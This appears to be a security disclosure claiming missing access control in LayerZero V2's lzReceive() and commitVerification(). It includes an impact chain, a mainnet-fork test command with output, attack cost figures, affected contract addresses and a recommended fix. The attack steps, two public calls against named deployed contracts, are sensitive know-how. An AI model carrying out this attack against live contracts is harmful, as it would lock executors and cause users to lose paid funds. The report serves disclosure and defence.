LayerZero — Zero-Privilege Execution Bypass via `lzReceive()` and `commitVerification()`

Summary :  
`EndpointV2.lzReceive()` and `ReceiveUln302.commitVerification()` have no access control. 
Any EOA can call both functions directly, permanently bypassing `LzExecutor.commitAndExecute()`. 
This allows an attacker to deliver any verified message with `msg.value = 0`, 
permanently locking out the legitimate executor and causing irrecoverable loss of `lzReceive.value` funds paid by the user on the source chain.

Vulnerability :
Root Cause 1 — `EndpointV2.lzReceive()`

```sol
solidityfunction lzReceive(
    Origin calldata _origin,
    address _receiver,
    bytes32 _guid,
    bytes   calldata _message,
    bytes   calldata _extraData
) external payable {
    // NO ACCESS CONTROL
    _clearPayload(...);
    ILayerZeroReceiver(_receiver).lzReceive{value: msg.value}(...);
    emit PacketDelivered(_origin, _receiver);
}
```
Any EOA can call this. No executor check, no whitelist, no role.
Root Cause 2 — `ReceiveUln302.commitVerification()`
Any EOA can call `commitVerification()` once DVN quorum is met. Confirmed by on-chain transaction `0x87c8e26c132b2139cad5f37f86d28b510816f35f5e16eb98cfbfb30dfdb0830b` (block 470350217, Arbitrum) — called by a non-privileged EOA with no protocol role.
Root Cause 3 — Irrecoverable Terminal State
`_clearPayload()` sets `inboundPayloadHash` to `bytes32(0)` before the OApp call. Once cleared, both `_verifiable()` branches return false permanently. No re-verify, no re-execute, no recovery path exists.
Root Cause 4 — Fee Accounting Decoupled from Delivery
`lzReceive.value` is credited to the executor on the source chain at send time with no delivery verification. An attacker who executes via `lzReceive{value: 0}` causes the user's paid value to be permanently undelivered while the executor retains the full fee.

Impact Chain
```text
User sends cross-chain message on source chain
  └─ pays lzReceive.value = 83315220018830 wei (~$0.22)
  └─ executor fee credited in SendLib — irrevocable
          ↓
DVNs attest → commitVerification() callable (zero privilege)
          ↓
Attacker (fresh EOA, no role) calls:
  1. commitVerification(packetHeader, payloadHash) — succeeds
  2. endpoint.lzReceive{value: 0}(...)             — succeeds
          ↓
PacketDelivered emitted — state terminal
lzReceive.value: never forwarded to OApp
Executor: permanently locked (LzExecutor_Executed on retry)
User: no gas on destination, no retry path, no recovery
```
Proof of Concept
Real transaction used:

Source tx: `0x367968b665003eb8a9a75b8b1673e7e44db651ed655b223a0903697ee2fde374`
commitVerification by non-privileged EOA: `0x87c8e26c132b2139cad5f37f86d28b510816f35f5e16eb98cfbfb30dfdb0830b`
Fork block: `470350217` (Arbitrum)
`lzReceive.value` paid: `83315220018830 wei`

Run:
```bash
bashforge test --match-test test_NativeDropBypass_ZeroPrivilege \
  --fork-url <ARB_RPC> \
  --fork-block-number 470350217 -vvvv
```
Output:
```text
[PASS] test_NativeDropBypass_ZeroPrivilege() (gas: 686707)

--- PRE-CONDITIONS PASSED ---
lazyNonce before : 543        ← message not yet executed
payload hash     : live       ← commitVerification already on-chain
attacker balance : 0          ← fresh EOA, no ETH, no role

--- STEP 1 PASSED: lzReceive by address(0xbad) ---
--- PROOF 1: terminal state confirmed ---
    inboundPayloadHash: bytes32(0)
    lazyInboundNonce:   544

--- PROOF 3: executor permanently locked ---

=== ALL PROOFS PASSED ===
attacker cost    : ~$0.001
native drop lost : 83315220018830 wei
recovery path    : NONE
```

Attack Economics
```text
                                                Value
Attacker cost per message           ~$0.001 (gas only, Arbitrum)
lzReceive.value lost per message    Configurable — 83315220018830 wei in proven case
Scalability                         Unlimited — any verified pending message
Attack sophistication               Minimal — two public function calls
Recovery path                                    None
```
The attacker requires no capital, no protocol role, 
no prior interaction. The attack is repeatable on every chain where LayerZero is deployed.

Affected Contracts:
```text
Contract               Address (Arbitrum)                                         Issue
EndpointV2     0x1a44076050125825900e736c501f859c50fE728c            lzReceive() — no access control
ReceiveUln302  0x7B9E184e07a6EE1aC23eAe0fe8D6Be2f663f05e6         commitVerification() — no access control
LzExecutor     0x31CAe3B7fB82d847621859fb1585353c5720660D             Permanently locked after bypass
```
Deployed identically across all LayerZero V2 chains — Ethereum, Arbitrum, Base, Optimism, BSC, Avalanche, Polygon.

Recommended Fix
```sol
solidity// EndpointV2.lzReceive()
function lzReceive(...) external payable {
    if (!isRegisteredExecutor(msg.sender))
        revert Errors.LZ_Unauthorized();
    _clearPayload(...);
    ILayerZeroReceiver(_receiver).lzReceive{value: msg.value}(...);
    emit PacketDelivered(_origin, _receiver);
}
```

Alternatively, bind fee release to verified delivery so executor cannot retain lzReceive.value for unexecuted service.

Severity
High — zero-privilege access control bypass on core protocol infrastructure, 
cross-chain, no recovery, proven on mainnet fork with real transaction data. 
Economic loss is conditional on attacker targeting a message with lzReceive.value > 0 
which is demonstrably common across LayerZero's production traffic.
